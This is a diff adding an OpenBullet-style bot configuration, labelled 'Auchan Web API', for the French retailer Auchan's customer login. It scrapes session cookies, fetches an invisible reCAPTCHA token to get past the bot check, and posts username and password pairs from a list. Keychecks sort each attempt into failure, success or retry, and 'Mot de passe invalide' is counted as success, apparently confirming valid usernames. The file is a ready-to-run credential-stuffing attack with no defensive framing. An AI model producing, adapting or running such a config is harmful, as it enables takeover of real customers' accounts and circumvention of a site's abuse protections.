@@ -1,0 +1,123 @@
+[SETTINGS]
+{
+  "Name": "Auchan Web API",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2023-11-16T21:49:37.7191975+01:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.auchan.fr/client/accueil" 
+  
+  HEADER "Host: www.auchan.fr" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-User: ?1" 
+
+#1 PARSE "<SOURCE>" LR "class=\"login-form\" action=\"" "\" method=\"post\">" -> VAR "1" 
+
+FUNCTION Replace "amp;" "" "<1>" -> VAR "2" 
+
+#3 PARSE "<2>" LR "https://compte.auchan.fr" "" -> VAR "3" 
+
+#connect.sid PARSE "<COOKIES(connect.sid)>" LR "" "" -> VAR "connect.sid" 
+
+#AUTH_SESSION_ID PARSE "<COOKIES(AUTH_SESSION_ID)>" LR "" "" -> VAR "AUTH_SESSION_ID" 
+
+#AUTH_SESSION_ID_LEGACY PARSE "<COOKIES(AUTH_SESSION_ID_LEGACY)>" LR "" "" -> VAR "AUTH_SESSION_ID_LEGACY" 
+
+#KC_RESTART PARSE "<COOKIES(KC_RESTART)>" LR "" "" -> VAR "KC_RESTART" 
+
+REQUEST GET "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfU0V4mAAAAANrV2jfQRPkQbW8VoQkobV5Efw9b&co=aHR0cHM6Ly9jb21wdGUuYXVjaGFuLmZyOjQ0Mw..&hl=fr&v=Ai7lOI0zKMDPHxlv62g7oMoJ&size=invisible&cb=pei88jv49ino" 
+  
+
+PARSE "<SOURCE>" LR "id=\"recaptcha-token\" value=\"" "\"" -> VAR "recaptoken" 
+
+REQUEST POST "https://www.google.com/recaptcha/api2/reload?k=6LfU0V4mAAAAANrV2jfQRPkQbW8VoQkobV5Efw9b" 
+  CONTENT "reason=q&c=<recaptoken>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+
+PARSE "<SOURCE>" LR "rresp\",\"" "\"" -> VAR "rresp" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<SOURCE>" DoesNotContain "rresp" 
+
+REQUEST POST "<2>" 
+  CONTENT "username=<USER>&password=<PASS>&g-recaptcha-response=<rresp>&rememberMe=on&credentialId=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie: AUTH_SESSION_ID_LEGACY=<AUTH_SESSION_ID_LEGACY>; KC_RESTART=<KC_RESTART>; AUTH_SESSION_ID=<AUTH_SESSION_ID>" 
+  HEADER "Host: compte.auchan.fr" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Length: 1629" 
+  HEADER "Origin: null" 
+  HEADER "Alt-Used: compte.auchan.fr" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: AUTH_SESSION_ID_LEGACY=<AUTH_SESSION_ID_LEGACY>; KC_RESTART=<KC_RESTART>; AUTH_SESSION_ID=<AUTH_SESSION_ID>" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "TE: trailers" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Nom d&#39;utilisateur ou mot de passe invalide" 
+  KEYCHAIN Success OR 
+    KEY "Mot de passe invalide" 
+  KEYCHAIN Retry OR 
+    KEY "429 Too Many Requests" 
+
